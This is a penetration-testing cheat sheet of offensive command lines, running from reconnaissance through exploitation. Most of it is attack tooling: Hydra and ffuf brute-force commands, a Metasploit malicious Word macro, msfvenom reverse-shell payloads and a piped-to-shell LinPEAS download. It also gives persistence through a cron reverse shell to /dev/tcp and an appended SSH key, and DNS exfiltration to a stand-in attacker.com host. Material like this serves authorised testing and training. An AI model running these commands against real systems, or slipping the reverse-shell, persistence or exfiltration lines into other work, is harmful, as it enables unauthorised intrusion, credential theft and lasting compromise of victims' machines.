# Cybersecurity Penetration Testing Reference Sheet

---

## 1. 🔍 Reconnaissance & Discovery

### Network Discovery
```bash
# Basic network ping sweep
nmap -sn 192.168.1.0/24

# Discover live hosts with OS detection
nmap -sn -O 192.168.1.0/24

# ARP scan for local network discovery
arp-scan -l
```

### Host Information Gathering
```bash
# Basic host information
nmap -sS <target_ip>

# Banner grabbing
nc -nv <target_ip> <port>
telnet <target_ip> <port>
```

---

## 2. 🔎 Port Scanning & Service Enumeration

### Comprehensive Port Scanning
```bash
# Full TCP port scan with service detection and scripts
nmap -sC -sV -T4 -p- <target_ip>

# UDP port scan (top 1000 ports)
nmap -sU --top-ports 1000 <target_ip>

# Aggressive scan with OS detection
nmap -A -T4 <target_ip>

# Scan specific ports
nmap -p 21,22,23,25,53,80,110,443,993,995 <target_ip>

# Fast scan (top 100 ports)
nmap -F <target_ip>

# Stealth SYN scan
nmap -sS <target_ip>
```

### Service-Specific Enumeration
```bash
# HTTP/HTTPS service enumeration
nmap --script http-enum <target_ip>
nmap --script ssl-enum-ciphers -p 443 <target_ip>

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users <target_ip>

# FTP enumeration
nmap --script ftp-anon,ftp-bounce <target_ip>

# SSH enumeration
nmap --script ssh-hostkey,ssh-auth-methods <target_ip>
```

---

## 3. 🌐 Web Application Testing

### Directory and File Discovery
```bash
# Gobuster directory enumeration
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt

# Extended file type search
gobuster dir -u http://<target_ip> -x php,txt,json,js,css,pdf,html,asp,aspx,jsp -w /usr/share/wordlists/dirb/common.txt

# Recursive directory search
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r

# DNS subdomain enumeration
gobuster dns -d <domain> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Alternative directory busters
dirb http://<target_ip> /usr/share/wordlists/dirb/common.txt
dirsearch -u http://<target_ip> -e php,html,js,txt
```

### Web Vulnerability Scanning
```bash
# Nikto web vulnerability scanner
nikto -h http://<target_ip>

# WhatWeb fingerprinting
whatweb http://<target_ip>

# Curl headers and methods
curl -I http://<target_ip>
curl -X OPTIONS http://<target_ip> -v
```

---

## 4. 👥 User Enumeration

### SMB/NetBIOS Enumeration
```bash
# Comprehensive SMB enumeration
enum4linux -a <target_ip> | tee enum4linux_output.log

# Extract local users from enum4linux output
enum4linux -a <target_ip> | grep -i "local user"

# SMB null session enumeration
smbclient -L //<target_ip>/ -N
smbclient //<target_ip>/share_name -N

# SMB share enumeration with credentials
smbmap -H <target_ip> -u <username> -p <password>
```

### LDAP Enumeration
```bash
# LDAP anonymous bind
ldapsearch -x -h <target_ip> -b "dc=domain,dc=com"

# LDAP user enumeration
ldapsearch -x -h <target_ip> -b "dc=domain,dc=com" "(objectClass=user)"
```

### Web Application User Enumeration
```bash
# User enumeration via registration form
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://<target_ip>/register -mr "username already exists"

# User enumeration via login form
ffuf -w /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -X POST -d "username=FUZZ&password=invalid" -H "Content-Type: application/x-www-form-urlencoded" -u http://<target_ip>/login -fc 200
```

---

## 5. 🔓 Password Attacks

### Brute Force Attacks
```bash
# Hydra SSH brute force
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>

# Hydra HTTP POST brute force
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <target_ip> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Hydra FTP brute force
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ftp://<target_ip>

# Hydra RDP brute force
hydra -l <username> -P /usr/share/wordlists/rockyou.txt rdp://<target_ip>

# Multiple protocols
hydra -L userlist.txt -P passlist.txt <protocol>://<target_ip>
```

### SSH Key Attacks
```bash
# Convert SSH private key for John the Ripper
/opt/john/ssh2john.py <private_key_file> > ssh_hash.txt

# Crack SSH key passphrase
john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked password
john --show ssh_hash.txt
```

### Web Application Password Attacks
```bash
# FFUF login brute force
ffuf -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=admin&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://<target_ip>/login -fc 200

# Patator HTTP brute force
patator http_fuzz url=http://<target_ip>/login method=POST body='username=admin&password=FILE0' 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep='Invalid'
```

---

## 6. 🌍 DNS Enumeration & Subdomain Discovery

### DNS Information Gathering
```bash
# DNS reconnaissance
dnsrecon -t brt -d <domain>

# Comprehensive DNS enumeration
dnsrecon -d <domain> -t std,rvl,srv,axfr,bing,yand,crt,snoop,tld,zonewalk

# Subdomain enumeration with Sublist3r
sublist3r -d <domain> -v

# DNS zone transfer attempt
dig axfr <domain> @<dns_server>

# DNS brute force
dnsmap <domain> -w /usr/share/wordlists/dnsmap.txt
```

### Alternative Subdomain Discovery
```bash
# Amass subdomain enumeration
amass enum -d <domain>

# Assetfinder
assetfinder <domain>

# Findomain
findomain -t <domain>
```

---

## 7. 🎯 Social Engineering & Phishing

### Metasploit Payload Generation
```bash
# Start Metasploit
msfconsole

# Create malicious Word document
msf6 > use exploit/multi/fileformat/office_word_macro
msf6 exploit(multi/fileformat/office_word_macro) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/fileformat/office_word_macro) > set LHOST <your_ip>
msf6 exploit(multi/fileformat/office_word_macro) > set LPORT 4444
msf6 exploit(multi/fileformat/office_word_macro) > exploit

# Set up listener
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <your_ip>
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit
```

### Alternative Payload Generation
```bash
# MSFVenom payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe > payload.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf > payload.elf
msfvenom -p php/meterpreter_reverse_tcp LHOST=<your_ip> LPORT=4444 -f raw > payload.php
```

---

## 8. 🔍 Open Source Intelligence (OSINT)

### Shodan Queries
```bash
# Basic Shodan searches (use via web interface)
# Find specific services: "apache 2.4"
# Find by country: country:"US"
# Find by organization: org:"Company Name"
# Find webcams: "Server: SQ-WEBCAM"
# Find databases: "MongoDB Server Information"
```

### Other OSINT Tools
```bash
# TheHarvester email enumeration
theHarvester -d <domain> -l 500 -b google,bing,yahoo

# Google dorking examples
# site:target.com filetype:pdf
# site:target.com inurl:admin
# site:target.com intitle:"index of"
```

---

## 9. ⬆️ Privilege Escalation

### Linux Privilege Escalation
```bash
# Check current privileges
id
whoami
groups

# SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Capabilities enumeration
getcap -r / 2>/dev/null

# Check sudo permissions
sudo -l

# World-writable directories
find / -writable -type d 2>/dev/null

# Cron jobs
cat /etc/crontab
crontab -l
ls -la /etc/cron*

# Check for interesting files
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
find /home -name "*.txt" -o -name "*.pdf" -o -name "*.config" 2>/dev/null

# System information
uname -a
cat /etc/issue
cat /proc/version
lscpu
```

### Windows Privilege Escalation
```cmd
# System information
systeminfo
whoami /priv
whoami /groups

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

# Check scheduled tasks
schtasks /query /fo LIST /v

# Check for AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\
```

### Automated Privilege Escalation Tools
```bash
# LinPEAS (Linux)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# WinPEAS (Windows)
# Download and run winPEAS.exe

# Linux Smart Enumeration
wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh
bash lse.sh
```

---

## 10. 🛠️ Post-Exploitation

### File Transfer Methods
```bash
# Python HTTP server
python3 -m http.server 8000

# Wget download
wget http://<your_ip>:8000/file

# Curl download
curl -O http://<your_ip>:8000/file

# SCP transfer
scp file.txt user@<target_ip>:/tmp/

# Base64 encoding for file transfer
base64 file.txt
# Decode on target: echo "base64_content" | base64 -d > file.txt
```

### Persistence Mechanisms
```bash
# Add SSH key (Linux)
echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# Cron job persistence (Linux)
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'" | crontab -

# Service persistence (Linux)
# Create service file in /etc/systemd/system/
```

---

## 11. 📚 Useful Resources & References

### Common Wordlists Locations
- `/usr/share/wordlists/rockyou.txt` - Password list
- `/usr/share/wordlists/dirb/common.txt` - Directory list
- `/usr/share/wordlists/SecLists/` - Collection of security lists
- `/usr/share/wordlists/dirbuster/` - Directory buster lists


### Helpful Write-ups & Guides
- [Bounty Hacker TryHackMe Write-up](https://infosecwriteups.com/bounty-hacker-write-up-tryhackme-4afca1389f5a)
- OWASP Testing Guide
- PayloadsAllTheThings GitHub repository
- GTFOBins - Unix binaries for privilege escalation

---

## 🔧 Additional Tools & Commands

### Network Analysis
```bash
# Netstat connections
netstat -tulpn

# Process monitoring
ps aux
top
htop

# Network interfaces
ifconfig
ip a
```

### Log Analysis
```bash
# System logs
tail -f /var/log/syslog
tail -f /var/log/auth.log
journalctl -f

# Web server logs
tail -f /var/log/apache2/access.log
tail -f /var/log/nginx/access.log
```

### Data Exfiltration
```bash
# DNS exfiltration
dig $(echo -n "data" | base64).attacker.com

# ICMP exfiltration
ping -c 1 -p $(echo -n "data" | xxd -p) <target_ip>
```


